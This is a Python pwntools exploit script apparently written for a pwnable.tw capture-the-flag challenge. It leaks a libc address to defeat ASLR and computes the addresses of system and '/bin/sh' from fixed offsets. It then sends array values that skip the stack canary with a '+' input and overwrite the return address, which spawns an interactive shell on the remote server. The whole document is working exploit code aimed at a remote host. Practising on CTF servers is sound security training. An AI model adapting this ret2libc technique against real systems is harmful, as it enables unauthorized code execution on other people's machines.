from pwn import *


"""
You may have to try this exploit multiple times before you succeed.
"""


HOST = "chall.pwnable.tw"
PORT = 10101


def leaker(conn):
    """
    This function tries to trigger a leak on the server connected via conn.
    This leak exposes an address to the loaded libc segment in memory,
    allowing an attacker to defeat ASLR by calculating offsets. This function
    is a hit or miss: If the leak appears in a format that is not expected
    the function cannot extract the leaked address, but the challenge server
    has been consistently showing promising results with this function.
    """

    delta_system = -1529536  # Offset from leak to system.
    delta_binsh = -356725  # Offset from leak to "/bin/sh".
    name_response = ""  # The response that we get by submitting our name.
    leak_addr = 0  # The address leaked in the response.

    conn.clean(0.5)  # Clearing anything in the read buffer.
    conn.sendline('A'*24)  # Triggering the leak.

    name_response = conn.recvuntil(',')  # Loading the response.

    try:
        leak_addr = u32('\x00'+name_response[31:34])  # Extracting the leak.
    except struct.error:
        log.failure("Unexpected server response format. Please try again.")
        conn.close()
        exit(1)

    log.info("Got leak_addr: %s" % hex(leak_addr))

    # Return a tuple containing system address and /bin/sh address.
    return (leak_addr+delta_system, leak_addr+delta_binsh)


def main():
    conn = remote(HOST, PORT)

    system_ptr, binsh_ptr = leaker(conn)  # Getting addrs from the leak.
    log.info("Got system_ptr: %s" % hex(system_ptr))
    log.info("Got binsh_ptr: %s" % hex(binsh_ptr))

    # Setting the array size large enough to cover our exploit.
    conn.sendline("35")

    # Making our way towards the return address.
    for i in range(24):
        conn.sendline('0')

    # Skip overwriting the canary.
    conn.sendline('+')

    # More padding. I used system_ptr-1 because I wanted to order to be
    # maintained.
    for i in range(25, 32):
        conn.sendline(str(system_ptr-1))

    conn.sendline(str(system_ptr))  # Overwriting return addr with system.
    conn.sendline(str(system_ptr+1))  # Padding.
    conn.sendline(str(binsh_ptr))  # PTR to "/bin/sh" as an argument.

    conn.clean(1)  # Cleaning up any server extraneous server responses.
    conn.interactive()  # Start an interactive session.

    conn.close()


if __name__ == "__main__":
    main()

